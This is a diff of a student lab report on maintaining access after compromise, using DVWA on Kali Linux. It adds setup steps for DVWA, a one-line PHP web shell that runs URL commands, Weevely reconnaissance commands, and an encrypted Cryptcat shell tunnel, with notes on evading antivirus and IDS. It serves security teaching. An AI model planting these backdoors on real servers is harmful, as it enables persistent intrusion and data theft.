@@ -6,35 +6,73 @@ controlled environment or on authorized targets.
 
 ## Introduction  
 **Maintaining Access** phase or also known as **persistence** in the target system, involves hacker that installs software or make changes to the target machine in order to access the target over time. Hence, allowing the hacker to stay connected with the target machine which prevent the need to start the process from scratch for the same target (GeeksforGeeks, 2025).    
-
 *Kali Linux* comes with multiple pre-installed hacking tools for all phases of ethical hacking. Under the post-exploitation category there are several hacking tools that are meant for maintaining access. The tools are classified as follows:   
 - OS back doors
 - Tunnelling and exfiltration
 - Web back doors
-
+For this particular task (Maintaining Access), a web back door and tunnelling techniques was explored and configured using three distinct tools.
+ 
 **Objective:** To demonstrate post-exploitation techniques for maintaining access on a compromised target server using three distinct tools.  
 
 **Target Environment:** *Kali Linux* (Attacker) and Vulnerable Target Application (*Damn Vulnerable Web Application, DVWA*)  
 
 **Tools:** *Webshells, Weevely, Cryptcat*
 
-## Installation Target Environment: Vulnerable Target Application (DVWA)  
+# Target Environment Setup: Installing DVWA  
+The *Damn Vulnerable Web Application (DVWA)* is a PHP/MariaDB web application that is vulnerable. It was developed as an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to help both students & teachers to learn about web application security in a controlled class room environment (Wood, 2022).
+
+Such vulnerable web application was used in this task in order to perform the said post-exploitation techniques. *DVWA* was manually installed and configured on the local *Kali Linux* Apache server.
+
+## Step-by-Step Execution  
+This section explains the step-by-step execution using Webshell, reproducing the tutorial and explanation provided by Wood (2022) and Swain (2025).  
+  
+**Step 1: Downloading the Source Code**
 (insert ss)  
-**Command**: `blahblah`
+**Command**: `cd /var/www/html`  
+`sudo git clone https://github.com/digininja/DVWA.git`  
+**Reason of command:** The `cd` command navigates into the Apache web server's default public directory. The `git clone` command reaches out to GitHub and downloads the entire repository of DVWA's raw PHP source code directly into that folder so the web server can host it.    
+(insert ss)  
+**Step 2: Creating Configuration File**  
+**Command:** `sudo cp config/config.inc.php.dist config/config.inc.php`  
+**Reason of command:** DVWA does not come with a ready-to-use configuration file to prevent accidental deployment errors (Wood, 2022; Swain, 2025). Alternatively, it provides a template file ending in `.dist` (distribution). The `cp` (copy) command clones this template into an active PHP file that the application will actually read to find its database credentials.  
+**Step 3: Starting Database Service**    
+(insert ss)  
+**Command:** `sudo service mariadb start`  
+**Reason of command:** Before the application can function, the backend database service must be running. This command boots up the MariaDB (MySQL) server so it is ready to accept connections.    
+**Step 4: Provisioning the Database & User**
+(insert ss)  
+**Command:** `sudo mysql -u root -p`  
+**Reason of command:** This logs into the MariaDB command-line monitor as the administrative root user, allows building the backend infrastructure for DVWA.  
+**SQL Commands Executed:**  
+`create database dvwa;`  
+`create user dvwa@127.0.x.x identified by '....';`  
+`grant all on dvwa.* to dvwa@127.0.x.x;`  
+`flush privileges;`  
+The `create database` allocates a dedicated storage space just for this application. The `create user` creates a specific database user with the exact password that matches the `config.inc.php` file from Step 2. Meanwhile, `grant all` gives new user full administrative rights over the dvwa database, explicitly binding it to the `127.0.x.x` local IP to fix socket connection issues. The `flush privileges` forces the database to immediately reload its security tables, locking in our new user permissions. **Step 5: Finalizing Setup @ Web Interface**
+(insert ss)  
+**Action:** Navigating to `http://127.0.x.x/DVWA/setup.php` in the web browser and reviewing the Setup Check.  
+**Reason for action:** While the MariaDB database was created in the terminal, it is currently empty. The DVWA setup page performs a system check to verify that all necessary backend components (like PHP modules) are running correctly. Once verified, clicking the "Create / Reset Database" button at the bottom of this page triggers the application to automatically build the necessary tables and populate them with default data, completing the installation process.  
+**Step 6: Verififcation & Dashboard Access**  
+(insert ss)  
+**Action:** Logging into the application with the default credentials (`admin / password`) and accessing the main DVWA Welcome screen.    
+This confirms the complete and successful installation of the target environment. The Apache web server is properly serving the PHP application, and the platform is successfully communicating with the newly created MariaDB backend. The left-hand navigation menu is now fully populated with the intentionally vulnerable modules, providing the exact sandbox environment needed to begin the post-exploitation and maintaining access phases of the lab.  
 
-## 1. Webshells  
-**Webshell** consist of a single-line script that executes system commands through web browser URL parameters. They are written in web programming languages such as *PHP, Java, Perl* and others. An attacker can control the script and a *command injection vulnerability* occurs.  
-### 1.1 Key Features  
+# 1. Webshells  
+**Webshell** consist of a single-line script that executes system commands through web browser URL parameters. They are written in web programming languages such as *PHP, Java, Perl* and others (Heath, 2023). An attacker can control the script and a *command injection vulnerability* occurs (Heath, 2023).  
+
+## 1.1 Key Features  
 The three key features of Webshells are as follows (Gemini, 2026):
-#### 1.1.1 Simplicity  
+### 1.1.1 Simplicity  
 Small enough to be hidden inside legitimate website code without drawing attention.
-- Firewall Evasion: Traffic blends in perfectly with normal HTTP/HTTPS web browsing.
-- Stateless Execution: Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent"
+### 1.1.2 Firewall Evasion  
+Traffic blends in perfectly with normal HTTP/HTTPS web browsing.
+### 1.1.3 Stateless Execution  
+Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent
 
-### 1.2 Step-by-Step Execution  
+## 1.2 Step-by-Step Execution  
+This section explains the step-by-step execution using Webshell, reproducing the tutorial and explanation generated by Gemini (2026).  
 
-**Step 1: Creating a Backdoor**  
-This section explains the step-by-step execution using Webshell, reproducing the tutorial generated by Gemini (2026).  
+**Step 1: Creating a Backdoor**    
 (insert ss)  
 **Command:** `echo "<?php system(\$_GET['cmd']); ?>" > simple_shell.php`    
 **Reason of command:** This writes a tiny PHP script that takes whatever text is placed in the `cmd` URL parameter and passes it directly to the underlying Linux operating system.  
@@ -43,14 +81,20 @@ This section explains the step-by-step execution using Webshell, reproducing the
 **Action:** Upload php file in DVWA and accessed via web browser at `.../simple_shell.php?cmd=whoami`  
 **Reason of action:** Navigating to this specific URL triggers the Apache web server to run the PHP script, execute the system command (`whoami`), and print the result straight to the webpage.  
 
-## 2. Weevely  
-" **Weevely** is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones"―  *Kali Linux*  
-### 2.1 Key Features  
-- Polymorphic Obfuscation: Evades basic antivirus and Intrusion Detection Systems (IDS).
-- Encrypted Communications: Secures the traffic between the attacker and the web server.
-- Built-in Post-Exploitation Modules: Allows for system enumeration, file management, and lateral movement without uploading additional tools"― *Gemini*
+# 2. Weevely  
+"**Weevely** is a stealth PHP web shell that simulate telnet-like connection. It is an essential tool for web application post exploitation, and can be used as stealth backdoor or as a web shell to manage legit web accounts, even free hosted ones"― *Kali Linux (2025)*  
 
-### 2.2 Step-by-Step Execution  
+## 2.1 Key Features  
+The three key features of Weevely are as follows (Gemini, 2026):
+### 2.1.1 Polymorphic Obfuscation  
+Evades basic antivirus and Intrusion Detection Systems (IDS).
+### 2.1.2 Encrypted Communications  
+Secures the traffic between the attacker and the web server.
+### 2.1.3 Built-in Post-Exploitation Modules  
+Allows for system enumeration, file management, and lateral movement without uploading additional tools
+
+## 2.2 Step-by-Step Execution  
+This section explains the step-by-step execution using Weevely, reproducing the tutorial and explanation provided by Cloud Learning (2019).  
 
 **Step 1: Generating Payload**  
 (insert ss)  
@@ -65,18 +109,24 @@ This section explains the step-by-step execution using Webshell, reproducing the
 **Reason of command:** This initiates the encrypted connection from the attacker machine to the uploaded script, establishing the remote command-line interface.  
 (insert ss)  
 **Command:** `system_info`  
-**Reason of command:** This command performs automated system reconnaissance. It instantly tells the attacker what operating system is running, the kernel version, and the current user privileges. This is the critical first step in planning a "Privilege Escalation" attack to become the root administrator. 
+**Reason of command:** This command performs automated system reconnaissance. It instantly tells the attacker what operating system is running, the kernel version, and the current user privileges. This is the critical first step in planning a "Privilege Escalation" attack to become the root administrator.  
 **Command:** `file_ls`  
 **Reason of command:** This command allows the attacker to silently map out the target's file system. Instead of guessing where things are, the attacker uses this to browse the server's folders to locate sensitive information such as database configuration files with hardcoded passwords, without triggering security alarms. 
 
-## 3. Cryptcat  
+# 3. Cryptcat  
 CryptCat provides a two-way encrypted version of the standard NetCat enhanced program, where it functions as the most basic Unix utility tool, reading and publishing data across network connections (Chandel, 2020). CryptCat encrypts data that users send across a network using either the TCP or UDP protocol, and it acts as a dependable back-end tool that users can easily utilize with scripts (Chandel, 2020).  
-### 3.1 Key Features
-- Military-Grade Twofish Encryption: Ensures that packet sniffers (like Wireshark) cannot read the commands or data being transmitted.
-- Protocol/Service Independence: Bypasses the need for a web server entirely; works directly over raw TCP ports.
-- Bi-Directional Versatility: Can act as a listener or a client to create stealthy, point-to-point data connections"― *Gemini*
+
+## 3.1 Key Features
+The three key features of Cryptcat are as follows (Gemini, 2026):
+### 3.1.1 Military-Grade Twofish Encryption  
+Ensures that packet sniffers (like Wireshark) cannot read the commands or data being transmitted.
+### 3.1.2 Protocol/Service Independence  
+Bypasses the need for a web server entirely, and works directly over raw TCP ports.
+### 3.1.3 Bi-Directional Versatility  
+Can act as a listener or a client to create stealthy, point-to-point data connections.
 
 ### 3.2 Step-by-Step Execution  
+This section explains the step-by-step execution using Cryptcat, reproducing the tutorial and explanation generated by Gemini (2026).  
 
 **Step 1: Setting up the Encrypted Listener (Attacker)**  
 (insert ss)  
@@ -98,11 +148,23 @@ Based on our experience using these tools, all of it manage to successfully main
 
   On the other hand, *Cryptcat* operates at the Transport Layer to establish a standalone network tunnel. *Cryptcat* removes the dependency on the web server entirely by using a named pipe to route the shell through Twofish encryption. Consequently, this ensures that if the web application is taken offline or patched by administrators, a secure, independent lifeline to the underlying operating system remains intact.  
 
-## Conclusion
+# Conclusion
 (Write a brief concluding sentence about how relying on multiple persistence methods ensures an attacker maintains access even if one backdoor is discovered and patched).  
 
-## References
+# References
+Chandel, R. (2020, April 2). *Comprehensive guide on CryptCat*. Hacking Articles. https://www.hackingarticles.in/comprehensive-guide-on-cryptcat/  
 
+Cloud Learning (2019, December 10). *Web Hacking for Begginers #19 How to Use Weevely PHP Backdoor* [Video]. Youtube. https://youtu.be/Y1gY5En6MsM?si=bVOiri_LUoSXNeHl  
+
+GeeksforGeeks. (2025, July 23). *Maintaining access tools in Kali Linux*. https://www.geeksforgeeks.org/linux-unix/maintaining-access-tools-in-kali-linux/  
+
+Heath, M. (2023, July 6). *Web Shells: Understanding attacker's tools and techniques*. F5 Labs. https://www.f5.com/labs/articles/web-shells-understanding-attackers-tools-and-techniques  
+
+Kali Linux. (2025, December 9). *Weevely*. https://www.kali.org/tools/weevely/  
+
+Swain, P. (2025, February 21). *Install DVWA in Kali Linux !* [Video]. Youtube. https://youtu.be/FFDdetzSy0s?si=fJ9xwf4UwY00gzFa
+
+Wood, R. (2022, September 16). *Installing DVWA in Kali Linux*. [Video]. Youtube. https://youtu.be/WkyDxNJkgQ4?si=OWxpls95wMxwaTlc
 
 
 
